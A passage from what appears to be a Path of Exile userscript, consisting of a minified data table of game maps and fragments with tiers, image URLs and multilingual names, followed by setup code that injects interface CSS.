Emblem",language:{code:"th"}}],region:-1},{id:402,tier:14,tiers:[0,0,0,0,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/WastePool.png?scale=1&mn=11&mt=",names:[{name:"Waste Pool Map",language:{code:"en"}},{name:"Cloaque, Carte",language:{code:"fr"}},{name:"'Ödes Becken'-Karte",language:{code:"de"}},{name:"황폐한 웅덩이 지도(Waste Pool Map)",language:{code:"ko"}},{name:"Mapa: Lago Poluído",language:{code:"pt"}},{name:"Карта помойного пруда",language:{code:"ru"}},{name:"Mapa de Charca de Desechos",language:{code:"es"}},{name:"Waste Pool Map",language:{code:"th"}}],region:6},{id:623,tier:90,tiers:[90],img:"https://web.poecdn.com/image/Art/2DItems/Maps/SynthesisColdGuardianMap.png",names:[{name:"Altered Distant Memory",language:{code:"en"}},{name:"Souvenir lointain altéré",language:{code:"fr"}},{name:"Veränderte entfernte Erinnerung",language:{code:"de"}},{name:"뒤바뀐 희미한 기억(Altered Distant Memory)",language:{code:"ko"}},{name:"Memória Distante Alterada",language:{code:"pt"}},{name:"Изменённое отдалённое воспоминание",language:{code:"ru"}},{name:"Memoria Lejana Alterada",language:{code:"es"}},{name:"ความทรงจำที่ห่างไกลที่ถูกแก้ไข",language:{code:"th"}}],region:-1},{id:378,tier:11,tiers:[0,0,11,13,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/CorpseTrench.png?scale=1&mn=11&mt=",names:[{name:"Coral Ruins Map",language:{code:"en"}},{name:"Ruines coralliennes, Carte",language:{code:"fr"}},{name:"'Korallenruinen'-Karte",language:{code:"de"}},{name:"산호 유적 지도(Coral Ruins Map)",language:{code:"ko"}},{name:"Mapa: Ruínas de Coral",language:{code:"pt"}},{name:"Карта коралловых руин",language:{code:"ru"}},{name:"Mapa de Ruinas de Coral",language:{code:"es"}},{name:"Coral Ruins Map",language:{code:"th"}}],region:7},{id:432,tier:2,tiers:[2,6,9,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/OvergrownShrine.png?scale=1&mn=11&mt=",names:[{name:"Overgrown Shrine Map",language:{code:"en"}},{name:"Sanctuaire abandonné, Carte",language:{code:"fr"}},{name:"'Verwilderter Schrein'-Karte",language:{code:"de"}},{name:"무성한 성소 지도(Overgrown Shrine Map)",language:{code:"ko"}},{name:"Mapa: Santuário Denso",language:{code:"pt"}},{name:"Карта заросшей обители",language:{code:"ru"}},{name:"Mapa de Santuario Descuidado",language:{code:"es"}},{name:"Overgrown Shrine Map",language:{code:"th"}}],region:1},{id:855,tier:12,tiers:[0,0,0,12,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/RobotTunnelSilo.png?scale=1&mn=11&mt=",names:[{name:"Silo Map",language:{code:"en"}},{name:"Silo Map",language:{code:"fr"}},{name:"Silo Map",language:{code:"de"}},{name:"Silo Map",language:{code:"ko"}},{name:"Silo Map",language:{code:"pt"}},{name:"Silo Map",language:{code:"ru"}},{name:"Silo Map",language:{code:"es"}},{name:"Silo Map",language:{code:"th"}}],region:2},{id:425,tier:13,tiers:[0,0,0,13,16],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Coves.png?scale=1&mn=11&mt=",names:[{name:"Coves Map",language:{code:"en"}},{name:"Crique, Carte",language:{code:"fr"}},{name:"'Buchten'-Karte",language:{code:"de"}},{name:"만 지도(Coves Map)",language:{code:"ko"}},{name:"Mapa: Enseadas",language:{code:"pt"}},{name:"Карта бухты",language:{code:"ru"}},{name:"Mapa de Caletas",language:{code:"es"}},{name:"Coves Map",language:{code:"th"}}],region:2},{id:390,tier:15,tiers:[0,0,0,0,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/OvergrownRuin.png?scale=1&mn=11&mt=",names:[{name:"Overgrown Ruin Map",language:{code:"en"}},{name:"Ruine abandonnée, Carte",language:{code:"fr"}},{name:"'Verwilderte Ruine'-Karte",language:{code:"de"}},{name:"무성한 유적 지도(Overgrown Ruin Map)",language:{code:"ko"}},{name:"Mapa: Ruína Coberta",language:{code:"pt"}},{name:"Карта заросших руин",language:{code:"ru"}},{name:"Mapa de Ruina Descuidada",language:{code:"es"}},{name:"Overgrown Ruin Map",language:{code:"th"}}],region:3},{id:454,tier:4,tiers:[4,8,11,12,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Palace.png?scale=1&mn=11&mt=",names:[{name:"Palace Map",language:{code:"en"}},{name:"Palais, Carte",language:{code:"fr"}},{name:"'Palast'-Karte",language:{code:"de"}},{name:"궁전 지도(Palace Map)",language:{code:"ko"}},{name:"Mapa: Palácio",language:{code:"pt"}},{name:"Карта дворца",language:{code:"ru"}},{name:"Mapa de Palacio",language:{code:"es"}},{name:"Palace Map",language:{code:"th"}}],region:4},{id:743,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/EshsEnrichedBreachstone.png",names:[{name:"Esh's Enriched Breachstone",language:{code:"en"}},{name:"Pierre de Brèche enrichie d'Esh",language:{code:"fr"}},{name:"Eshs angereicherter Riss-Stein",language:{code:"de"}},{name:"에쉬의 풍부한 균열석",language:{code:"ko"}},{name:"Pedra de Fenda Enriquecida de Esh",language:{code:"pt"}},{name:"Обогащённый камень Разлома Иш",language:{code:"ru"}},{name:"Piedra de Fisura Enriquecida de Esh",language:{code:"es"}},{name:"Esh's Enriched Breachstone",language:{code:"th"}}],region:-1},{id:350,tier:5,tiers:[5,9,12,14,16],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Chateau.png?scale=1&mn=11&mt=",names:[{name:"Chateau Map",language:{code:"en"}},{name:"Grand château, Carte",language:{code:"fr"}},{name:"'Herrensitz'-Karte",language:{code:"de"}},{name:"대저택 지도(Chateau Map)",language:{code:"ko"}},{name:"Mapa: Castelo",language:{code:"pt"}},{name:"Карта усадьбы",language:{code:"ru"}},{name:"Mapa de Palacete",language:{code:"es"}},{name:"Chateau Map",language:{code:"th"}}],region:0},{id:710,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/PaleCourt01.png",names:[{name:"Eber's Key",language:{code:"en"}},{name:"Clé d'Eber",language:{code:"fr"}},{name:"Ebers Schlüssel",language:{code:"de"}},{name:"에버의 열쇠",language:{code:"ko"}},{name:"Chave de Eber",language:{code:"pt"}},{name:"Ключ Эвера",language:{code:"ru"}},{name:"Llave de Eber",language:{code:"es"}},{name:"Eber's Key",language:{code:"th"}}],region:-1},{id:445,tier:2,tiers:[2,5,9,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Arsenal.png?scale=1&mn=11&mt=",names:[{name:"Arsenal Map",language:{code:"en"}},{name:"Arsenal, Carte",language:{code:"fr"}},{name:"'Arsenal'-Karte",language:{code:"de"}},{name:"병기창 지도(Arsenal Map)",language:{code:"ko"}},{name:"Mapa: Arsenal",language:{code:"pt"}},{name:"Карта арсенала",language:{code:"ru"}},{name:"Mapa de Arsenal",language:{code:"es"}},{name:"Arsenal Map",language:{code:"th"}}],region:6},{id:342,tier:7,tiers:[0,7,9,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Quay.png?scale=1&mn=11&mt=",names:[{name:"Port Map",language:{code:"en"}},{name:"Port, Carte",language:{code:"fr"}},{name:"'Port'-Karte",language:{code:"de"}},{name:"항만 지도(Port Map)",language:{code:"ko"}},{name:"Mapa: Porto",language:{code:"pt"}},{name:"Карта порта",language:{code:"ru"}},{name:"Mapa de Puerto",language:{code:"es"}},{name:"Port Map",language:{code:"th"}}],region:6},{id:716,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/AtlasMaps/FragmentMinotaur.png",names:[{name:"Fragment of the Minotaur",language:{code:"en"}},{name:"Fragment du Minotaure",language:{code:"fr"}},{name:"Fragment des Minotauren",language:{code:"de"}},{name:"미노타우로스의 지도 조각",language:{code:"ko"}},{name:"Fragmento do Minotauro",language:{code:"pt"}},{name:"Фрагмент Минотавра",language:{code:"ru"}},{name:"Fragmento del Minotauro",language:{code:"es"}},{name:"Fragment of the Minotaur",language:{code:"th"}}],region:-1},{id:760,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/LabyrinthHarvestInfused2.png",names:[{name:"Dedication to the Goddess",language:{code:"en"}},{name:"Dévouement à la déesse",language:{code:"fr"}},{name:"Hingabe an die Göttin",language:{code:"de"}},{name:"여신에게 바치는 헌신",language:{code:"ko"}},{name:"Dedicação à Deusa",language:{code:"pt"}},{name:"Посвящение богине",language:{code:"ru"}},{name:"Consagración a la Diosa",language:{code:"es"}},{name:"Dedication to the Goddess",language:{code:"th"}}],region:-1},{id:720,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/AtlasMapGuardianFire.png",names:[{name:"Fragment of Enslavement",language:{code:"en"}},{name:"Fragment de l'Asservissement",language:{code:"fr"}},{name:"Fragment der Versklavung",language:{code:"de"}},{name:"예속의 조각",language:{code:"ko"}},{name:"Fragmento do Escravisador",language:{code:"pt"}},{name:"Фрагмент порабощения",language:{code:"ru"}},{name:"Fragmento de esclavitud",language:{code:"es"}},{name:"Fragment of Enslavement",language:{code:"th"}}],region:-1},{id:389,tier:3,tiers:[3,7,10,12,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Infestation.png?scale=1&mn=11&mt=",names:[{name:"Infested Valley Map",language:{code:"en"}},{name:"Vallée infestée, Carte",language:{code:"fr"}},{name:"'Verseuchtes Tal'-Karte",language:{code:"de"}},{name:"감염된 계곡 지도(Infested Valley Map)",language:{code:"ko"}},{name:"Mapa: Vale Infestado",language:{code:"pt"}},{name:"Карта заражённой долины",language:{code:"ru"}},{name:"Mapa de Valle Infestado",language:{code:"es"}},{name:"Infested Valley Map",language:{code:"th"}}],region:5},{id:362,tier:3,tiers:[3,7,10,12,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/VaalCity.png?scale=1&mn=11&mt=",names:[{name:"Ancient City Map",language:{code:"en"}},{name:"Cité antique, Carte",language:{code:"fr"}},{name:"'Antike Stadt'-Karte",language:{code:"de"}},{name:"고대 도시 지도(Ancient City Map)",language:{code:"ko"}},{name:"Mapa: Cidade Antiga",language:{code:"pt"}},{name:"Карта древнего города",language:{code:"ru"}},{name:"Mapa de Ciudad Antigua",language:{code:"es"}},{name:"Ancient City Map",language:{code:"th"}}],region:6},{id:422,tier:11,tiers:[0,0,0,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Colonnade.png?scale=1&mn=11&mt=",names:[{name:"Colonnade Map",language:{code:"en"}},{name:"Colonnades, Carte",language:{code:"fr"}},{name:"'Kolonnade'-Karte",language:{code:"de"}},{name:"가로수 지도(Colonnade Map)",language:{code:"ko"}},{name:"Mapa: Colunata",language:{code:"pt"}},{name:"Карта колоннады",language:{code:"ru"}},{name:"Mapa de Columnata",language:{code:"es"}},{name:"Colonnade Map",language:{code:"th"}}],region:2},{id:438,tier:3,tiers:[3,6,10,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Racecourse.png?scale=1&mn=11&mt=",names:[{name:"Racecourse Map",language:{code:"en"}},{name:"Champ de courses, Carte",language:{code:"fr"}},{name:"'Rennbahn'-Karte",language:{code:"de"}},{name:"경주장 지도(Racecourse Map)",language:{code:"ko"}},{name:"Mapa: Hipódromo",language:{code:"pt"}},{name:"Карта ипподрома",language:{code:"ru"}},{name:"Mapa de Estadio",language:{code:"es"}},{name:"Racecourse Map",language:{code:"th"}}],region:2},{id:737,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/TulsChargedBreachstone.png",names:[{name:"Tul's Charged Breachstone",language:{code:"en"}},{name:"Pierre de Brèche chargée de Tul",language:{code:"fr"}},{name:"Tuls geladener Riss-Stein",language:{code:"de"}},{name:"툴의 충전된 균열석",language:{code:"ko"}},{name:"Pedra de Fenda Energizada de Tul",language:{code:"pt"}},{name:"Заряженный камень Разлома Тул",language:{code:"ru"}},{name:"Piedra de Fisura Cargada de Tul",language:{code:"es"}},{name:"Tul's Charged Breachstone",language:{code:"th"}}],region:-1},{id:399,tier:3,tiers:[3,7,10,12,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/LunarisTemple.png?scale=1&mn=11&mt=",names:[{name:"Moon Temple Map",language:{code:"en"}},{name:"Temple lunaire, Carte",language:{code:"fr"}},{name:"'Mondtempel'-Karte",language:{code:"de"}},{name:"달의 사원 지도(Moon Temple Map)",language:{code:"ko"}},{name:"Mapa: Templo Lunar",language:{code:"pt"}},{name:"Карта храма Луны",language:{code:"ru"}},{name:"Mapa de Templo de la Luna",language:{code:"es"}},{name:"Moon Temple Map",language:{code:"th"}}],region:0},{id:738,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/EshsChargedBreachstone.png",names:[{name:"Esh's Charged Breachstone",language:{code:"en"}},{name:"Pierre de Brèche chargée d'Esh",language:{code:"fr"}},{name:"Eshs geladener Riss-Stein",language:{code:"de"}},{name:"에쉬의 충전된 균열석",language:{code:"ko"}},{name:"Pedra de Fenda Energizada de Esh",language:{code:"pt"}},{name:"Заряженный камень Разлома Иш",language:{code:"ru"}},{name:"Piedra de Fisura Cargada de Esh",language:{code:"es"}},{name:"Esh's Charged Breachstone",language:{code:"th"}}],region:-1},{id:428,tier:1,tiers:[1,4,8,10,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Mesa.png?scale=1&mn=11&mt=",names:[{name:"Mesa Map",language:{code:"en"}},{name:"Mesa, Carte",language:{code:"fr"}},{name:"'Hochebene'-Karte",language:{code:"de"}},{name:"메사 지도(Mesa Map)",language:{code:"ko"}},{name:"Mapa: Mesa",language:{code:"pt"}},{name:"Карта плоского холма",language:{code:"ru"}},{name:"Mapa de Mesa",language:{code:"es"}},{name:"Mesa Map",language:{code:"th"}}],region:2},{id:392,tier:2,tiers:[2,6,10,12,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Quarry.png?scale=1&mn=11&mt=",names:[{name:"Geode Map",language:{code:"en"}},{name:"Géode, Carte",language:{code:"fr"}},{name:"'Geode'-Karte",language:{code:"de"}},{name:"정동석 지도(Geode Map)",language:{code:"ko"}},{name:"Mapa: Geodo",language:{code:"pt"}},{name:"Карта жеоды",language:{code:"ru"}},{name:"Mapa de Geoda",language:{code:"es"}},{name:"Geode Map",language:{code:"th"}}],region:2},{id:366,tier:13,tiers:[0,0,0,13,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Mausoleum.png?scale=1&mn=11&mt=",names:[{name:"Mausoleum Map",language:{code:"en"}},{name:"Mausolée, Carte",language:{code:"fr"}},{name:"'Mausoleum'-Karte",language:{code:"de"}},{name:"능묘 지도(Mausoleum Map)",language:{code:"ko"}},{name:"Mapa: Mausoléu",language:{code:"pt"}},{name:"Карта мавзолея",language:{code:"ru"}},{name:"Mapa de Mausoleo",language:{code:"es"}},{name:"Mausoleum Map",language:{code:"th"}}],region:5},{id:361,tier:4,tiers:[4,7,11,12,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Sewer.png?scale=1&mn=11&mt=",names:[{name:"Toxic Sewer Map",language:{code:"en"}},{name:"Égouts toxiques, Carte",language:{code:"fr"}},{name:"'Giftige Kanalisation'-Karte",language:{code:"de"}},{name:"맹독성 하수도 지도(Toxic Sewer Map)",language:{code:"ko"}},{name:"Mapa: Esgoto Tóxico",language:{code:"pt"}},{name:"Карта клоаки",language:{code:"ru"}},{name:"Mapa de Alcantarilla Tóxica",language:{code:"es"}},{name:"Toxic Sewer Map",language:{code:"th"}}],region:0},{id:383,tier:4,tiers:[4,8,11,13,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Catacomb.png?scale=1&mn=11&mt=",names:[{name:"Bone Crypt Map",language:{code:"en"}},{name:"Crypte à ossements, Carte",language:{code:"fr"}},{name:"'Knochenkrypta'-Karte",language:{code:"de"}},{name:"뼈 지하실 지도(Bone Crypt Map)",language:{code:"ko"}},{name:"Mapa: Cripta de Ossos",language:{code:"pt"}},{name:"Карта гробницы",language:{code:"ru"}},{name:"Mapa de Cripta de Hueso",language:{code:"es"}},{name:"Bone Crypt Map",language:{code:"th"}}],region:4},{id:456,tier:3,tiers:[3,6,9,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Basilica.png?scale=1&mn=11&mt=",names:[{name:"Basilica Map",language:{code:"en"}},{name:"Basilique, Carte",language:{code:"fr"}},{name:"'Basilika'-Karte",language:{code:"de"}},{name:"교회당 지도(Basilica Map)",language:{code:"ko"}},{name:"Mapa: Basílica",language:{code:"pt"}},{name:"Карта базилики",language:{code:"ru"}},{name:"Mapa de Basílica",language:{code:"es"}},{name:"Basilica Map",language:{code:"th"}}],region:6},{id:602,tier:90,tiers:[90],img:"https://web.poecdn.com/image/Art/2DItems/Maps/UndeadSiege.png",names:[{name:"The Coward's Trial",language:{code:"en"}},{name:"L'Épreuve du couard",language:{code:"fr"}},{name:"Die Prüfung des Feiglings",language:{code:"de"}},{name:"겁쟁이의 시험(The Coward's Trial)",language:{code:"ko"}},{name:"Julgamento do Covarde",language:{code:"pt"}},{name:"Испытание труса",language:{code:"ru"}},{name:"La Prueba del Cobarde",language:{code:"es"}},{name:"The Coward's Trial",language:{code:"th"}}],region:-1},{id:615,tier:90,tiers:[90],img:"https://web.poecdn.com/image/Art/2DItems/Maps/PutridCloister.png",names:[{name:"The Putrid Cloister",language:{code:"en"}},{name:"Le Cloître putride",language:{code:"fr"}},{name:"Das faulige Kloster",language:{code:"de"}},{name:"악취 나는 수도원(The Putrid Cloister)",language:{code:"ko"}},{name:"O Claustro Pútrido",language:{code:"pt"}},{name:"Тлетворная обитель",language:{code:"ru"}},{name:"El Claustro Pútrido",language:{code:"es"}},{name:"The Putrid Cloister",language:{code:"th"}}],region:-1},{id:606,tier:90,tiers:[90],img:"https://web.poecdn.com/image/Art/2DItems/Maps/oba.png",names:[{name:"Oba's Cursed Trove",language:{code:"en"}},{name:"Le Trésor maudit d'Oba",language:{code:"fr"}},{name:"Obas verfluchter Schatz",language:{code:"de"}},{name:"오바의 저주받은 전리품(Oba's Cursed Trove)",language:{code:"ko"}},{name:"Tesouro Maldito de Oba",language:{code:"pt"}},{name:"Проклятый клад Обы",language:{code:"ru"}},{name:"Tesoro Embrujado de Oba",language:{code:"es"}},{name:"Oba's Cursed Trove",language:{code:"th"}}],region:-1},{id:756,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/DeliriumFragment.png",names:[{name:"Simulacrum",language:{code:"en"}},{name:"Simulacre",language:{code:"fr"}},{name:"Simulacrum",language:{code:"de"}},{name:"복제된 영토",language:{code:"ko"}},{name:"Simulacrum",language:{code:"pt"}},{name:"Симулякр",language:{code:"ru"}},{name:"Simulacro",language:{code:"es"}},{name:"Simulacrum",language:{code:"th"}}],region:-1},{id:413,tier:3,tiers:[3,6,10,12,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Arachnid.png?scale=1&mn=11&mt=",names:[{name:"Arachnid Tomb Map",language:{code:"en"}},{name:"Tombeau arachnide, Carte",language:{code:"fr"}},{name:"'Arachnidengruft'-Karte",language:{code:"de"}},{name:"거미류 무덤 지도(Arachnid Tomb Map)",language:{code:"ko"}},{name:"Mapa: Tumba Aracnídea",language:{code:"pt"}},{name:"Карта паучьей гробницы",language:{code:"ru"}},{name:"Mapa de Tumba Arácnida",language:{code:"es"}},{name:"Arachnid Tomb Map",language:{code:"th"}}],region:2},{id:437,tier:3,tiers:[3,6,10,12,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Necropolis.png?scale=1&mn=11&mt=",names:[{name:"Necropolis Map",language:{code:"en"}},{name:"Nécropole, Carte",language:{code:"fr"}},{name:"'Totenstadt'-Karte",language:{code:"de"}},{name:"매장지 지도(Necropolis Map)",language:{code:"ko"}},{name:"Mapa: Necrópole",language:{code:"pt"}},{name:"Карта некрополя",language:{code:"ru"}},{name:"Mapa de Necrópolis",language:{code:"es"}},{name:"Necropolis Map",language:{code:"th"}}],region:1},{id:721,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/AtlasMapGuardianLightning.png",names:[{name:"Fragment of Eradication",language:{code:"en"}},{name:"Fragment de l'Éradication",language:{code:"fr"}},{name:"Fragment der Vernichtung",language:{code:"de"}},{name:"절멸의 조각",language:{code:"ko"}},{name:"Fragmento do Erradicador",language:{code:"pt"}},{name:"Фрагмент искоренения",language:{code:"ru"}},{name:"Fragmento de erradicación",language:{code:"es"}},{name:"Fragment of Eradication",language:{code:"th"}}],region:-1},{id:369,tier:12,tiers:[0,0,0,12,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Phantasmagoria.png?scale=1&mn=11&mt=",names:[{name:"Phantasmagoria Map",language:{code:"en"}},{name:"Fantasmagorie, Carte",language:{code:"fr"}},{name:"'Phantasmagorie'-Karte",language:{code:"de"}},{name:"환영 지도(Phantasmagoria Map)",language:{code:"ko"}},{name:"Mapa: Fantasmagoria",language:{code:"pt"}},{name:"Карта фантасмагории",language:{code:"ru"}},{name:"Mapa de Fantasmagoria",language:{code:"es"}},{name:"Phantasmagoria Map",language:{code:"th"}}],region:3},{id:431,tier:3,tiers:[3,6,10,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Summit.png?scale=1&mn=11&mt=",names:[{name:"Summit Map",language:{code:"en"}},{name:"Sommet, Carte",language:{code:"fr"}},{name:"'Gipfel'-Karte",language:{code:"de"}},{name:"꼭대기 지도(Summit Map)",language:{code:"ko"}},{name:"Mapa: Cume",language:{code:"pt"}},{name:"Карта вершины",language:{code:"ru"}},{name:"Mapa de Cima",language:{code:"es"}},{name:"Summit Map",language:{code:"th"}}],region:5},{id:700,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Vaal01.png",names:[{name:"Sacrifice at Midnight",language:{code:"en"}},{name:"Sacrifice de minuit",language:{code:"fr"}},{name:"Opfergabe bei Mittnacht",language:{code:"de"}},{name:"심야의 희생",language:{code:"ko"}},{name:"Sacrifício à Meia-Noite",language:{code:"pt"}},{name:"Жертва в полночь",language:{code:"ru"}},{name:"Sacrificio a Medianoche",language:{code:"es"}},{name:"Sacrifice at Midnight",language:{code:"th"}}],region:-1},{id:364,tier:4,tiers:[4,8,11,13,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/SpiderLair.png?scale=1&mn=11&mt=",names:[{name:"Spider Lair Map",language:{code:"en"}},{name:"Antre d'araignées, Carte",language:{code:"fr"}},{name:"'Spinnenhöhle'-Karte",language:{code:"de"}},{name:"거미 소굴 지도(Spider Lair Map)",language:{code:"ko"}},{name:"Mapa: Covil da Aranha",language:{code:"pt"}},{name:"Карта паучьего логова",language:{code:"ru"}},{name:"Mapa de Guarida de la Araña",language:{code:"es"}},{name:"Spider Lair Map",language:{code:"th"}}],region:7},{id:746,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/XophsPureBreachstone.png",names:[{name:"Xoph's Pure Breachstone",language:{code:"en"}},{name:"Pierre de Brèche pure de Xoph",language:{code:"fr"}},{name:"Xophs purer Riss-Stein",language:{code:"de"}},{name:"조프의 순수한 균열석",language:{code:"ko"}},{name:"Pedra de Fenda Pura de Xoph",language:{code:"pt"}},{name:"Очищенный камень Разлома Ксофа",language:{code:"ru"}},{name:"Piedra de Fisura Pura de Xoph",language:{code:"es"}},{name:"Xoph's Pure Breachstone",language:{code:"th"}}],region:-1},{id:745,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/ChayulasEnrichedBreachstone.png",names:[{name:"Chayula's Enriched Breachstone",language:{code:"en"}},{name:"Pierre de Brèche enrichie de Chayula",language:{code:"fr"}},{name:"Chayulas angereicherter Riss-Stein",language:{code:"de"}},{name:"차율라의 풍부한 균열석",language:{code:"ko"}},{name:"Pedra de Fenda Enriquecida de Chayula",language:{code:"pt"}},{name:"Обогащённый камень Разлома Чаюлы",language:{code:"ru"}},{name:"Piedra de Fisura Enriquecida de Chayula",language:{code:"es"}},{name:"Chayula's Enriched Breachstone",language:{code:"th"}}],region:-1},{id:434,tier:16,tiers:[0,0,0,0,16],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/CrystalOre.png?scale=1&mn=11&mt=",names:[{name:"Crystal Ore Map",language:{code:"en"}},{name:"Gisement de cristal, Carte",language:{code:"fr"}},{name:"'Kristallmine'-Karte",language:{code:"de"}},{name:"수정 광석 지도(Crystal Ore Map)",language:{code:"ko"}},{name:"Mapa: Reserva de Cristal",language:{code:"pt"}},{name:"Карта кристальной шахты",language:{code:"ru"}},{name:"Mapa de Mina de Cristal",language:{code:"es"}},{name:"Crystal Ore Map",language:{code:"th"}}],region:4},{id:344,tier:16,tiers:[0,0,0,0,16],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Cells.png?scale=1&mn=11&mt=",names:[{name:"Cells Map",language:{code:"en"}},{name:"Cellules, Carte",language:{code:"fr"}},{name:"'Zellen'-Karte",language:{code:"de"}},{name:"감방 지도(Cells Map)",language:{code:"ko"}},{name:"Mapa: Celas",language:{code:"pt"}},{name:"Карта камер",language:{code:"ru"}},{name:"Mapa de Celdas",language:{code:"es"}},{name:"Cells Map",language:{code:"th"}}],region:0},{id:622,tier:90,tiers:[90],img:"https://web.poecdn.com/image/Art/2DItems/Maps/PillarsOfVastiri.png",names:[{name:"Pillars of Arun",language:{code:"en"}},{name:"Les Piliers d'Arun",language:{code:"fr"}},{name:"Säulen von Arun",language:{code:"de"}},{name:"아룬의 기둥(Pillars of Arun)",language:{code:"ko"}},{name:"Pilares de Arun",language:{code:"pt"}},{name:"Столпы Арун",language:{code:"ru"}},{name:"Pilares de Arun",language:{code:"es"}},{name:"Pillars of Arun",language:{code:"th"}}],region:-1},{id:370,tier:3,tiers:[3,7,10,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Academy.png?scale=1&mn=11&mt=",names:[{name:"Academy Map",language:{code:"en"}},{name:"Académie, Carte",language:{code:"fr"}},{name:"'Akademie'-Karte",language:{code:"de"}},{name:"학술원 지도(Academy Map)",language:{code:"ko"}},{name:"Mapa: Academia",language:{code:"pt"}},{name:"Карта академии",language:{code:"ru"}},{name:"Mapa de Academia",language:{code:"es"}},{name:"Academy Map",language:{code:"th"}}],region:6}]};
  var DEBUG = false;
  
  var DELAY = 0;

  var fontsCSS = GM_getResourceText ("fontsCSS");
  GM_addStyle (fontsCSS);
  GM_addStyle(`.gs-style-enabler .gs-frame,.gs-style-enabler .gs-style{background-color:#e8eff2;border:1px dashed #111;border-radius:5px;padding:5px}.gs-style-enabler .gs-style{background-color:#e8eff2;color:#222;padding:1px 2px}.gs-style-enabler .gs-style a{color:#09c;text-decoration:underline dashed}.gs-style-enabler .gs-style.gs-warning{color:#856404;background-color:#fff3cd;border-color:#856404}.gs-style-enabler .gs-style-light{font-size:.8em;font-style:italic;opacity:.9;background-color:#fff;line-height:1.2em}.gs-style-enabler .gs-style-light.gs-style{padding:1px 5px}.gs-style a,a.gs-style{cursor:pointer}.gs-style.gs-button{margin-right:5px;padding:2px 5px}body.frame-setting-frame{background-color:#e8eff2}.gs-clickable,a i.fas{cursor:pointer}.gs-frame{width:90%;min-height:300px;max-width:900px;height:85%;position:fixed;left:50%;transform:translateX(-50%);top:7.5%;z-index:100001}.gs-backdrop{width:100%;min-height:300px;height:100%;position:fixed;left:0;top:0;z-index:100000;background:rgba(255,255,255,.3)}.hide{display:none}.nowrap{white-space:nowrap}.gs-pull-right{float:right}.gs-pull-left{float:left}.tippy-content a{color:#222}.patreon-button img{height:47px;border-radius:1.5rem}.paypal-form{padding-bottom:0;margin-bottom:-6px}#saved-alert{position:fixed;z-index:0;padding-left:0;padding-right:30px}.modal-dialog.modal-xl{max-width:90%}.gs-loading{width:300px;height:300px;position:fixed;left:50%;top:50%;z-index:100001;transform:translateX(-50%) translateY(-50%)}@-webkit-keyframes rotate-forever{0%{-webkit-transform:rotate(0);-moz-transform:rotate(0);-ms-transform:rotate(0);-o-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);-moz-transform:rotate(360deg);-ms-transform:rotate(360deg);-o-transform:rotate(360deg);transform:rotate(360deg)}}@-moz-keyframes rotate-forever{0%{-webkit-transform:rotate(0);-moz-transform:rotate(0);-ms-transform:rotate(0);-o-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);-moz-transform:rotate(360deg);-ms-transform:rotate(360deg);-o-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes 